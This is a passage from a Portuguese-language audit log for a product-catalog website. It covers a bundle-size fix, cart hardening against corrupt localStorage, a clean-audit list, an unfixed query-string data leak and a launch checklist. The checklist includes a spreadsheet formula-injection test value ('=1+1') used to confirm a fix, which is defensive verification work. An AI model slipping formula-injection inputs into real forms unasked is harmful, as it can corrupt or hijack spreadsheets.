para a qual o índice de busca foi construído. O índice resolveu a busca; o Header
trouxe tudo de volta por outro caminho.

**A causa real é mais ampla que o Header:** qualquer componente client que
importe **qualquer coisa** de `lib/products.js` — até uma função pura como
`getProductImageAlt` — leva o JSON junto. Eram quatro fazendo isso.

**O que mudou:**

1. `lib/product-helpers.js` — as funções puras (SKU composto, alt de imagem,
   query de configuração, label legível) saíram do módulo que carrega o catálogo.
   `products.js` reexporta todas, então nenhum import existente mudou.
2. Header, ProductFinder e CatalogPageClient recebem as categorias **como prop**
   do Server Component, com `productCount` já resolvido (`getCategoryNav` e
   `getCategoryCards`). Em vez de mandar o catálogo e deixar o client filtrar,
   manda-se só o que ele desenha.

**Resultado medido:** o chunk de 114 KB desaparece; nenhuma string do catálogo
sobra no JS. First Load JS: home 126→107 kB, `/catalogo` 119→100, família
119→101, ficha 122→104, cotização 121→103.

**Commit:** `perf: saca el catálogo completo del bundle del navegador`

---

### 34d. Dois menores

- **`CartProvider` fazia `setItems(JSON.parse(saved))` sem conferir a forma.** Um
  valor que desserialize pra algo que não seja array quebra o `items.reduce` do
  próprio provider — e o provider embrulha o site inteiro, então o sintoma é
  **tela branca em toda página**, irrecuperável a não ser limpando os dados do
  site, que ninguém sabe fazer. Hoje não havia como acontecer (a chave
  `bga-cart-v2` nasceu junto com o schema atual, no commit do item 1), mas a
  próxima troca de schema é uma linha de distância. Agora valor estranho começa
  com carrinho vazio.
- **O fetch do formulário da home não tinha `keepalive`**, que o `lib/leads.js`
  tem. Hoje não muda nada — o `window.open` abre outra aba e não descarrega a
  página — mas os dois caminhos de captura têm que ter a mesma garantia.

**Commit:** `fix: carrito no se rompe con localStorage corrupto; keepalive en la home`

---

### O que a auditoria olhou e está limpo

Vale registrar, pra não reauditar: sitemap bate exatamente com as rotas geradas
(50 URLs, nenhuma apontando pra 404; `/404`, `/cotacao` e
`/politica-de-privacidad` fora, corretamente). Os 61 caminhos de asset do
`catalog.json` e todos os referenciados no código resolvem pra arquivo real.
Nenhum link interno quebrado no HTML gerado. Todo `target="_blank"` com
`rel="noopener noreferrer"`. Os parâmetros de configuração da URL na ficha são
validados contra valores reais do produto antes de aplicar — não dá pra injetar
nada por ali. O JSON-LD só serializa dado local. O React escapa o `q` da busca.
Nada sensível versionado, nenhum `.DS_Store` rastreado. Nenhum `force-dynamic`
sobrando, e o `useSearchParams` tem sua fronteira de Suspense.

### O que NÃO foi consertado, e por quê

**O formulário da home manda nome e RUC na query string** para
script.google.com. É inerente ao `doGet` do Apps Script e é o que já está
publicado hoje — mas significa que esses dados ficam nos logs de requisição do
Google. O caminho do carrinho (`doPost`) não tem isso. Só se resolve movendo o
formulário da home para `doPost` também, que é mexer no que já está no ar; não é
para fazer junto do lançamento.

---

## Checklist do dia da publicação — só verificável no ar

Junto com os itens 10 (404 no GA4) e 11 (política de privacidade):

- **`trailingSlash: true` × links sem barra.** Os links internos são escritos
  `/catalogo/bandejas`, sem barra final. Navegando dentro do site não dá
  problema; o risco é recarregar a página ou abrir um link compartilhado nessa
  URL — aí quem responde é o Amplify, conforme a configuração dele. Testar com o
  domínio apontado, antes de aposentar o `bga-site`.
- **Webhook do Apps Script é `no-cors`.** Se falhar, nem o site nem ninguém fica
  sabendo. É por desenho (o WhatsApp é o canal real, a planilha é registro), mas
  significa que "lead não chegou" só se descobre olhando a planilha. Conferir a
  aba "Cotizaciones" nos primeiros dias.
- **Apps Script v4 publicado?** (item 34a) O conserto da injeção de fórmula só
  existe depois de colar o arquivo no editor e publicar **nova versão** — editar
  o `Code.gs` não implanta. Vale também pro formulário da home, que já está no
  ar. Testar depois: mandar um lead com `=1+1` no campo Nombre e conferir que na
  planilha aparece o texto `=1+1`, não o número `2`.
- **Plataforma do app no Amplify diz "Web", não "Web Compute"?** (item 34b) Se
  disser Web Compute, há um servidor rodando na conta do cliente e o
  `amplify.yml` não pegou.
